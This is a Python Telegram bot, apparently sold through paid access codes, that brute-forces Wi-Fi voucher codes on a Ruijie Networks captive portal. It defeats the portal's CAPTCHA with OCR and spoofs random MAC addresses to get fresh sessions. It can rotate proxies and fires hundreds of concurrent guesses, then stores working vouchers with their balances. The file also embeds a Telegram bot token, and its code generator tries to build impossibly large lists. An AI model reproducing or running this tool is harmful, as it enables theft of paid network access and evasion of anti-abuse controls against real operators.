import re
import json
import base64
import random
import string
import time
import asyncio
import aiohttp
import sqlite3
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta
import os
import sys
import gc
import itertools
import nest_asyncio

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, ContextTypes, CommandHandler, CallbackQueryHandler

nest_asyncio.apply()

# ── CONFIGURATION ──────────────────────────────────────────────────────────
MAX_CONCURRENT = 200
CONNECTION_LIMIT = 200
ADMIN_USERNAME = "gobiln07"
ADMIN_URL = f"https://t.me/{ADMIN_USERNAME}"
TOKEN = "8810639279:AAHi3fEF7Kwhy274COsNgbTPXH-gAqehHhI"

# Proxy List
PROXY_LIST = [
    # "http://123.45.67.89:8080",
]
proxy_pool = itertools.cycle(PROXY_LIST) if PROXY_LIST else None

# ── DATABASE SETUP ────────────────────────────────────────────────────────
conn = sqlite3.connect('bot_database.db', check_same_thread=False)
conn.execute('PRAGMA journal_mode=WAL;')
cursor = conn.cursor()
db_lock = asyncio.Lock()

cursor.execute('''CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIMARY KEY, session_url TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS found_codes_db (user_id INTEGER, code TEXT, plan TEXT, time_val TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS access_codes (code TEXT PRIMARY KEY, duration_type TEXT, is_used INTEGER DEFAULT 0, used_by INTEGER DEFAULT 0)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS authorized_users (user_id INTEGER PRIMARY KEY, duration_type TEXT, expiry_time REAL)''')
conn.commit()

# ── OCR SETUP ─────────────────────────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)
        if img is None: return None
        _, buffer = cv2.imencode('.png', img)
        return _ocr.classification(buffer.tobytes()).upper()
    except:
        return None

def is_admin(username: str) -> bool:
    if not username:
        return False
    return username.lower() == ADMIN_USERNAME.lower()

def check_user_auth(user_id: int, username: str) -> bool:
    if is_admin(username):
        return True
    cursor.execute("SELECT expiry_time FROM authorized_users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    if row:
        expiry = row[0]
        if expiry > time.time():
            return True
    return False

def get_mac():
    return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, proxy=None, prev_sid=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'accept': 'text/html'}
    try:
        async with session_obj.get(url, headers=headers, proxy=proxy, allow_redirects=True, timeout=5) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else prev_sid
    except:
        return prev_sid

async def Captcha_Image(session_obj, session_id, proxy=None):
    params = {'sessionId': session_id, '_t': str(time.time())}
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36'}
    try:
        async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers, proxy=proxy, timeout=5) as req:
            return await req.read()
    except:
        return None

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Varify_Captcha(session_obj, session_id, text, proxy=None):
    json_data = {'sessionId': session_id, 'authCode': text}
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'content-type': 'application/json'}
    try:
        async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data, proxy=proxy, timeout=5) as req:
            data = await req.json()
            return session_id if data.get("success") else None
    except:
        return None

async def get_balance_info(session_id):
    endpoints = [f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}"]
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'accept': 'application/json'}
    async with aiohttp.ClientSession() as temp_session:
        for url in endpoints:
            try:
                async with temp_session.get(url, headers=headers, timeout=8) as resp:
                    if resp.status != 200: continue
                    data = await resp.json()
                    if not data.get("success", False): continue
                    result = data.get("result", {}) or data.get("data", {})

                    minutes = result.get('totalMinutes') or result.get('remainingMinutes') or result.get('minutes') or 0
                    bytes_val = result.get('totalBytes') or result.get('remainingBytes') or result.get('bytes') or result.get('data') or 0
                    plan_name = result.get("profileName") or result.get("planName") or result.get("name") or "Unknown"

                    if float(minutes) > 0 or float(bytes_val) > 0 or result.get("authorized") == True or result.get("status") == 1:
                        display_info = f"{plan_name}"
                        if float(bytes_val) > 0:
                            gb_val = float(bytes_val) / (1024 * 1024 * 1024)
                            display_info += f" | {gb_val:.2f} GB"
                        elif float(minutes) > 0:
                            display_info += f" | {minutes}m"
                        else:
                            display_info += " | Active"

                        return (display_info, plan_name)
            except: continue
    return None

def code_generator(mode):
    if mode == "6":
        codes = [str(i).zfill(6) for i in range(1000000)]
    elif mode == "7":
        codes = [str(i).zfill(7) for i in range(10000000)]
    elif mode == "8":
        codes = [str(i).zfill(8) for i in range(100000000)]
    elif mode == "9":
        codes = [str(i).zfill(9) for i in range(1000000000)]
    elif mode == "alpha6":
        chars = string.ascii_lowercase
        codes = [''.join(random.choices(chars, k=6)) for _ in range(100000000000)]
    elif mode == "mix6":
        chars = string.ascii_lowercase + string.digits
        codes = [''.join(random.choices(chars, k=6)) for _ in range(3000000000000000)]
    else:
        codes = [str(i).zfill(6) for i in range(10000000000000000000)]

    random.shuffle(codes)
    for code in codes:
        yield code

async def perform_check_silent(code, chat_obj, session_url, connector, context_data):
    if context_data.get('scan_stop', False): return None
    context_data['current_code'] = code
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    session_id = None
    timeout = aiohttp.ClientTimeout(total=8, connect=3)
    
    proxy = next(proxy_pool) if proxy_pool else None

    for _ in range(2):
        if context_data.get('scan_stop', False): return None
        try:
            async with aiohttp.ClientSession(connector=connector, connector_owner=False, cookie_jar=aiohttp.CookieJar(), timeout=timeout) as task_session:
                if not session_id:
                    session_id = await get_session_id(task_session, session_url, proxy=proxy)
                    if not session_id:
                        context_data['expired'] += 1; return None

                image = await Captcha_Image(task_session, session_id, proxy=proxy)
                if not image:
                    context_data['expired'] += 1; return None
                text = await Captcha_Text(image)
                if not text or not await Varify_Captcha(task_session, session_id, text, proxy=proxy):
                    context_data['expired'] += 1; continue

                data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": text}
                headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36", "content-type": "application/json"}
                async with task_session.post(post_url, json=data, headers=headers, proxy=proxy, timeout=6) as req:
                    response = await req.text()
                    if 'request limited' in response:
                        context_data['retry_total'] += 1; await asyncio.sleep(0.3); continue
                    
                    if 'logonUrl' in response or '"success":true' in response or 'auth success' in response:
                        balance_info = await get_balance_info(session_id)
                        if balance_info:
                            balance_display, plan_name = balance_info
                        else:
                            balance_display, plan_name = "Active", "Voucher Plan"

                        if not any(item['code'] == code for item in context_data['success_codes']):
                            context_data['success_codes'].insert(0, {"code": code, "plan": plan_name, "balance": balance_display})
                            context_data['hits'] += 1

                            user_id = chat_obj.id
                            async with db_lock:
                                cursor.execute("INSERT INTO found_codes_db (user_id, code, plan, time_val) VALUES (?, ?, ?, ?)", (user_id, code, plan_name, balance_display))
                                conn.commit()
                        return True
                    break
        except:
            continue
    context_data['expired'] += 1
    return None

async def run_scanner_background(query, session_url, mode, total_codes_count, context):
    context.user_data['scan_stop'] = False
    context.user_data['checked_total'] = 0
    context.user_data['hits'] = 0
    context.user_data['expired'] = 0
    context.user_data['retry_total'] = 0
    context.user_data['success_codes'] = []
    context.user_data['current_code'] = "000000"

    start_time = time.time()
    last_edit_time = 0
    connector = aiohttp.TCPConnector(limit=CONNECTION_LIMIT, ttl_dns_cache=300)
    code_gen = code_generator(mode)

    try:
        status_msg = await query.message.reply_text(f"🚀 စကන්ဖတ်ခြင်း စတင်ပါပြီ (Mode: {mode})...")
    except:
        status_msg = await query.message.chat.send_message(f"🚀 စကන්ဖတ်ခြင်း စတင်ပါပြီ (Mode: {mode})...")

    try:
        while not context.user_data.get('scan_stop', False):
            tasks = []
            for _ in range(MAX_CONCURRENT):
                if context.user_data.get('scan_stop', False): break
                try:
                    code = next(code_gen)
                    tasks.append(perform_check_silent(code, query.message.chat, session_url, connector, context.user_data))
                    context.user_data['checked_total'] += 1
                except StopIteration:
                    context.user_data['scan_stop'] = True
                    break
            if not tasks: break

            await asyncio.gather(*tasks)
            await asyncio.sleep(0.01)
            if context.user_data.get('scan_stop', False): break

            current_time = time.time()
            if current_time - last_edit_time < 1.0:
                continue
            last_edit_time = current_time

            checked_total = context.user_data.get('checked_total', 0)
            hits = context.user_data.get('hits', 0)
            expired = context.user_data.get('expired', 0)
            retry_total = context.user_data.get('retry_total', 0)
            current_code = context.user_data.get('current_code', '000000')

            elapsed_time = current_time - start_time
            speed_cm = (checked_total / elapsed_time) * 60 if elapsed_time > 0 else 0
            
            proxy_count = len(PROXY_LIST) if PROXY_LIST else 0
            proxy_status = f"-1/{proxy_count}" if proxy_count > 0 else "0/0"

            recent_hits = context.user_data.get('success_codes', [])[:25]
            hits_text = ""
            if recent_hits:
                hits_text = "\n💯 **Hit Codes:**\n" + "\n".join([f"`{h['code']}` 🎫 : {h['balance']}" for h in recent_hits])

            text = (
                f"𝐆𝐨𝐛𝐥𝐢𝐧 𝐜𝐨𝐝𝐞 𝐡𝐚𝐜𝐤\n"
                f"{session_url}\n"
                f" **Scanner Running** \n"
                f" Tried: {checked_total:,}\n"
                f" Current Code: {current_code}\n"
                f" Hits: {hits}\n"
                f" Expired: {expired}\n"
                f" Limits: {retry_total}\n"
                f" Speed: {speed_cm:.1f} c/m\n"
                f" Proxies: {proxy_status}\n\n"
                f"───────────────────────────────"
                f"{hits_text}"
            )
            try:
                await status_msg.edit_text(text, parse_mode="Markdown")
            except: 
                pass

    except Exception as e:
        print(e)
    finally:
        try: await connector.close()
        except: pass
        hits_count = context.user_data.get('hits', 0)
        checked_count = context.user_data.get('checked_total', 0)
        try:
            await query.message.chat.send_message(f"✅ ပြီးဆုံးပါပြီ (သို့) ရပ်တန့်လိုက်ပါပြီ။\nစုစုပေါင်း စစ်ဆေးပြီးစီးမှု: {checked_count:,}\nHits: {hits_count}")
        except:
            pass

# ── TELEGRAM HANDLERS ─────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    username = user.username

    if is_admin(username):
        async with db_lock:
            cursor.execute("INSERT OR REPLACE INTO authorized_users (user_id, duration_type, expiry_time) VALUES (?, ?, ?)", (user_id, "Admin", float('inf')))
            conn.commit()

    buy_text = f"\n\n🛒 **Code ဝယ်ယူရန်:** [Admin @gobiln07 သို့ ဆက်သွယ်ပါ]({ADMIN_URL})"

    if not check_user_auth(user_id, username):
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔑 Access Code ထည့်ရန်", callback_data="ask_code")],
            [InlineKeyboardButton("👨‍💻 Admin ဆက်သွယ်ရန်", url=ADMIN_URL)]
        ])
        await update.message.reply_text(
            f"🔒 **Access Denied**\n\nဤဘော့တ်ကို အသုံးပြုရန် Admin ထံမှ ရရှိထားသော Access Code လိုအပ်ပါသည်။ အောက်ပါခလုတ်ကိုနှိပ်ပြီး Code ထည့်သွင်းပါရန်။{buy_text}",
            reply_markup=keyboard,
            parse_mode="Markdown",
            disable_web_page_preview=True
        )
        return

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Session URL Setup", callback_data="set_url"), InlineKeyboardButton("🚀 Brute Force", callback_data="brute_menu")],
        [InlineKeyboardButton("💎 Saved Codes", callback_data="view_saved_codes"), InlineKeyboardButton("👨‍💻 Admin ဆက်သွယ်ရန်", url=ADMIN_URL)]
    ])

    if is_admin(username):
        admin_extra = "\n\n👑 **Admin Commands:**\n- `/gen 30မိနစ်` (သို့) `/gen30မိနစ်` - Key ထုတ်ရန်"
        await update.message.reply_text(f"🚀 **Brute Force Bot (Admin Panel)**\n\nအောက်ပါ Menu မှ ရွေးချယ်ပါ -{admin_extra}{buy_text}", reply_markup=keyboard, parse_mode="Markdown", disable_web_page_preview=True)
    else:
        await update.message.reply_text(f"🍺 **Ruijie Voucher Bot**\n\nအောက်ပါ Menu မှ ရွေးချယ်ပါ -{buy_text}", reply_markup=keyboard, parse_mode="Markdown", disable_web_page_preview=True)

async def ask_code_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data['waiting_for_code'] = True
    await query.message.reply_text("🔑 ကျေးဇူးပြု၍ သင့်ထံတွင်ရှိသော Access Code ကို ဤချတ်ဘောက်စ်ထဲတွင် ရိုက်ထည့်ပေးပါရန်။", parse_mode="Markdown")

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    user_id = message.from_user.id
    text = message.text.strip()

    if context.user_data.get('waiting_for_code', False):
        cursor.execute("SELECT duration_type, is_used FROM access_codes WHERE code = ?", (text,))
        row = cursor.fetchone()

        if row is None:
            await message.reply_text("❌ မှားယွင်းနေသော Access Code ဖြစ်ပါသည်။ Admin ထံတွင် တောင်းခံပါ။")
            return

        duration_type, is_used = row[0], row[1]
        if is_used == 1:
            await message.reply_text("⚠️ ဤ Access Code ကို အသုံးပြုပြီးသား ဖြစ်ပါသည်။")
            return

        duration_seconds = 0
        if "မိနစ်" in duration_type:
            mins = int(duration_type.replace("မိနစ်", ""))
            duration_seconds = mins * 60
        elif "နာရီ" in duration_type:
            hrs = int(duration_type.replace("နာရီ", ""))
            duration_seconds = hrs * 3600
        elif "ရက်" in duration_type:
            days = int(duration_type.replace("ရက်", ""))
            duration_seconds = days * 86400

        expiry_time = time.time() + duration_seconds

        async with db_lock:
            cursor.execute("UPDATE access_codes SET is_used = 1, used_by = ? WHERE code = ?", (user_id, text))
            cursor.execute("INSERT OR REPLACE INTO authorized_users (user_id, duration_type, expiry_time) VALUES (?, ?, ?)", (user_id, duration_type, expiry_time))
            conn.commit()

        context.user_data['waiting_for_code'] = False
        await message.reply_text(f"✅ **Access Granted!** သက်တမ်း ({duration_type}) ဖြင့် အောင်မြင်စွာ စတင်အသုံးပြုနိုင်ပါပြီ။")
        await start(update, context)
        return

    if context.user_data.get('waiting_for_url', False):
        if text.startswith("http://") or text.startswith("https://"):
            async with db_lock:
                cursor.execute("INSERT OR REPLACE INTO user_sessions (user_id, session_url) VALUES (?, ?)", (user_id, text))
                conn.commit()
            context.user_data['waiting_for_url'] = False

            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🌐 Session URL Setup", callback_data="set_url"), InlineKeyboardButton("🚀 Brute Force", callback_data="brute_menu")],
                [InlineKeyboardButton("💎 Saved Codes", callback_data="view_saved_codes")]
            ])
            await message.reply_text("✅ **Session URL သိမ်းဆည်းပြီးပါပြီ။** အောက်ပါ Menu မှ ဆက်လုပ်နိုင်ပါပြီ -", reply_markup=keyboard)
        else:
            await message.reply_text("❌ URL ပုံစံ မှန်ကန်မှု မရှိပါ။ http:// သို့မဟုတ် https:// ဖြင့် စတင်ရပါမည်။")
        return

async def gen_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_admin(user.username):
        await update.message.reply_text("⛔ ဤ විධාန် (Command) ကို Admin သာ အသုံးပြုနိုင်ပါသည်။")
        return

    arg = ""
    if context.args:
        arg = context.args[0].strip()
    else:
        msg_text = update.message.text.strip()
        if msg_text.startswith("/gen") and len(msg_text) > 4:
            arg = msg_text[4:].strip()

    valid_durations = ["10မိနစ်", "30မိနစ်", "1နာရီ", "2နာရီ", "3နာရီ", "10နာရီ", "1ရက်", "2ရက်", "3ရက်", "7ရက်", "15ရက်", "30ရက်"]

    if not arg or arg not in valid_durations:
        await update.message.reply_text(f"❌ ပုံစံမှားနေပါသည်။ ဥပမာ: `/gen 30မိနစ်` (သို့) `/gen30မိနစ်`\n\nရနိုင်သည်များ: {', '.join(valid_durations)}", parse_mode="Markdown")
        return

    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    async with db_lock:
        cursor.execute("INSERT OR REPLACE INTO access_codes (code, duration_type, is_used) VALUES (?, ?, 0)", (code, arg))
        conn.commit()

    await update.message.reply_text(f"🔑 **Generated Access Code ({arg}):**\n\n`{code}`", parse_mode="Markdown")

async def set_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    username = query.from_user.username

    if not check_user_auth(user_id, username):
        await query.message.reply_text("❌ သင့်အကောင့် သက်တမ်းကုန်ဆုံးသွားပါပြီ သို့မဟုတ် Access Code အရင်ထည့်ပါ။")
        return

    context.user_data['waiting_for_url'] = True
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="back_start")]])
    await query.message.reply_text("🌐 **Session URL Setup**\n\nSession URL ကို ဤချတ်ဘောက်စ်ထဲတွင် ရိုက်ထည့်ပါ သို့မဟုတ် paste လုပ်ပါ:", reply_markup=keyboard, parse_mode="Markdown")

async def brute_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    username = query.from_user.username

    if not check_user_auth(user_id, username):
        await query.message.reply_text("❌ သင့်အကောင့် သက်တမ်းကုန်ဆုံးသွားပါပြီ သို့မဟုတ် Access Code အရင်ထည့်ပါ။")
        return

    cursor.execute("SELECT session_url FROM user_sessions WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    if not row:
        await query.message.reply_text("❌ ကျေးဇူးပြု၍ ပထမဦးစွာ `Session URL Setup` ဖြင့် URL ထည့်သွင်းပါရန်။", parse_mode="Markdown")
        return

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("6 လုံး (0-9)", callback_data="mode_6"), InlineKeyboardButton("7 လုံး (0-9)", callback_data="mode_7")],
        [InlineKeyboardButton("8 လုံး (0-9)", callback_data="mode_8"), InlineKeyboardButton("9 လုံး (0-9)", callback_data="mode_9")],
        [InlineKeyboardButton("အက္ခရာ 6 လုံး (a-z)", callback_data="scan_alpha6"), InlineKeyboardButton("အရောအနှော 6 လုံး (a-z, 0-9)", callback_data="scan_mix6")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_start")]
    ])
    await query.message.reply_text("🚀 **Brute Force Scanner**\n\nScan mode ကို ရွေးချယ်ပါ:", reply_markup=keyboard, parse_mode="Markdown")

async def view_saved_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query if update.callback_query else None
    user_id = update.effective_user.id
    username = update.effective_user.username

    if not check_user_auth(user_id, username):
        msg = "❌ သင့်အကောင့် သက်တမ်းကုန်ဆုံးသွားပါပြီ သို့မဟုတ် Access Code အရင်ထည့်ပါ။"
        if query: await query.message.reply_text(msg)
        else: await update.message.reply_text(msg)
        return

    cursor.execute("SELECT code, plan, time_val FROM found_codes_db WHERE user_id = ? ORDER BY rowid DESC LIMIT 300", (user_id,))
    rows = cursor.fetchall()

    if not rows:
        msg = "📂 သင်သိမ်းဆည်းထားသော Wi-Fi Codes များ မရှိသေးပါ။"
        if query: await query.message.reply_text(msg)
        else: await update.message.reply_text(msg)
        return

    result_text = f"💎 **Saved Codes (Latest {len(rows)})**\n\n"
    for idx, item in enumerate(rows, 1):
        result_text += f"{idx}. Code: `{item[0]}` | Plan: {item[1]} | Balance: {item[2]}\n"

    if query:
        await query.message.reply_text(result_text, parse_mode="Markdown")
        await query.answer()
    else:
        await update.message.reply_text(result_text, parse_mode="Markdown")

async def back_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data['waiting_for_url'] = False
    context.user_data['waiting_for_code'] = False
    context.user_data['scan_stop'] = True
    await start(update, context)

async def stop_scanning(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['scan_stop'] = True
    await update.message.reply_text("🛑 **စကන්ဖတ်ခြင်းကို ရပ်တန့်လိုက်ပါပြီ။**", parse_mode="Markdown")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    user_id = query.from_user.id

    if data == "ask_code":
        await ask_code_callback(update, context)
        return
    elif data == "set_url":
        await set_url(update, context)
        return
    elif data == "brute_menu":
        await brute_menu(update, context)
        return
    elif data == "view_saved_codes":
        await view_saved_codes(update, context)
        return
    elif data == "back_start":
        await back_start(update, context)
        return
    elif data.startswith("mode_") or data.startswith("scan_"):
        await query.answer()
        cursor.execute("SELECT session_url FROM user_sessions WHERE user_id = ?", (user_id,))
        url_row = cursor.fetchone()
        if not url_row:
            await query.message.reply_text("❌ Session URL မတွေ့ရှိပါ။ ကျေးဇူးပြု၍ URL အရင်ထည့်ပါ။")
            return

        session_url = url_row[0]
        mode = data.replace("mode_", "").replace("scan_", "")

        if mode == "6": total_codes_count = 1000000
        elif mode == "7": total_codes_count = 10000000
        elif mode == "8": total_codes_count = 100000000
        elif mode == "9": total_codes_count = 1000000000
        elif mode in ["alpha6", "mix6"]: total_codes_count = 300000
        else: total_codes_count = 1000000

        asyncio.create_task(run_scanner_background(query, session_url, mode, total_codes_count, context))

# ── MAIN FUNCTION ─────────────────────────────────────────────────────────
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_scanning))
    app.add_handler(CommandHandler("gen", gen_key))
    app.add_handler(CommandHandler("saved", view_saved_codes))
    app.add_handler(CallbackQueryHandler(button_handler))

    from telegram.ext import MessageHandler, filters
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    print("🚀 Telegram Bot စတင်အလုပ်လုပ်နေပါပြီ...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
